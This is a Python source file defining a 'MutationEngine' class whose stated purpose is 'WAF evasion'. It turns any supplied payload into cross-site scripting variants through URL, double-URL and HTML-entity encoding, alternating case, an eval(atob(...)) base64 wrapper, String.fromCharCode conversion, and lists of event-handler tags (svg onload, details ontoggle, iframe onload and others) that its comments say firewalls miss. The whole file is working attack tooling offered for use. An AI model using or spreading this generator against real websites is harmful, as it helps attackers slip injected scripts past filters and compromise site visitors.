import base64
import urllib.parse

class MutationEngine:
    """Advanced payload mutations for WAF evasion"""
    
    @staticmethod
    def url_encode(payload):
        return urllib.parse.quote(payload)
    
    @staticmethod
    def double_url_encode(payload):
        return urllib.parse.quote(urllib.parse.quote(payload))
    
    @staticmethod
    def html_entity_encode(payload):
        result = ""
        for char in payload:
            result += f"&#x{ord(char):02x};"
        return result
    
    @staticmethod
    def mixed_case(payload):
        result = ""
        uppercase = True
        for char in payload:
            if char.isalpha():
                result += char.upper() if uppercase else char.lower()
                uppercase = not uppercase
            else:
                result += char
        return result
    
    @staticmethod
    def base64_wrapper(payload):
        """Wrap in atob eval"""
        encoded = base64.b64encode(payload.encode()).decode()
        return f"eval(atob('{encoded}'))"
    
    @staticmethod
    def string_fromcharcode(payload):
        """Convert to String.fromCharCode"""
        codes = [str(ord(c)) for c in payload]
        return f"String.fromCharCode({','.join(codes)})"
    
    @staticmethod
    def bypass_event_handlers(payload):
        """Alternative event handlers WAFs miss"""
        handlers = [
            f"<svg onload={payload}>",
            f"<math href=javascript:{payload}>",
            f"<details open ontoggle={payload}>",
            f"<video onloadstart={payload}>",
            f"<body onpageshow={payload}>"
        ]
        return handlers
    
    @staticmethod
    def unconventional_tags(payload):
        """Non-obvious tags"""
        tags = [
            f"<xss id=x onfocus={payload} tabindex=1>",
            f"<form onformdata={payload}>",
            f"<input onfocus={payload} autofocus>",
            f"<marquee onstart={payload}>",
            f"<iframe onload={payload}>"
        ]
        return tags
    
    def mutate_all(self, payload):
        """Generate all mutation variants"""
        variants = set()
        variants.add(payload)
        variants.add(self.url_encode(payload))
        variants.add(self.mixed_case(payload))
        variants.add(self.html_entity_encode(payload))
        variants.update(self.bypass_event_handlers(payload))
        variants.update(self.unconventional_tags(payload))
        return list(variants)
